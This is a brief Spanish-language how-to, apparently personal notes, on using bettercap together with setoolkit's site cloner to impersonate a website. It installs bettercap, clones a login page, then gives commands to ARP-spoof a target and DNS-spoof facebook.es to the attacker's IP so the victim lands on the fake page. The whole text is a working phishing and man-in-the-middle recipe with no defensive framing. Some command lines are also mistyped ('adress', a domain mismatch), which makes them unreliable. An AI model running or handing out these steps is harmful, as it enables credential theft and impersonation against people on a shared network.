
Es una de las herramientas para la realización de taques de suplantación de identidad

---
## Instalación

Para instalar bettercap

```
sudo apt-get install bettercap
```

---
### Spoofing dns

Antes de hacer el spoofing se necesita la pagina que se va hacer spoofing y utilizamos la herramienta `setoolkit > Social Engineering Attacks > Website Attack Vectors > Web Jacking > Site Cloner`

#### Iniciar el DNS Spoof

```
sudo bettercap
set arp.spoof.targets {IP-TARGET}
arp.spoof on
set dns.spoof
set dns.spoof.domains facebook.es # O cualquier pagina web que queramos suplantar
set dns.spoof adress {IP-ATACANTE}
dns.spoof on
```

Al meterse la victima al facebook.com accederá ala pagina fake

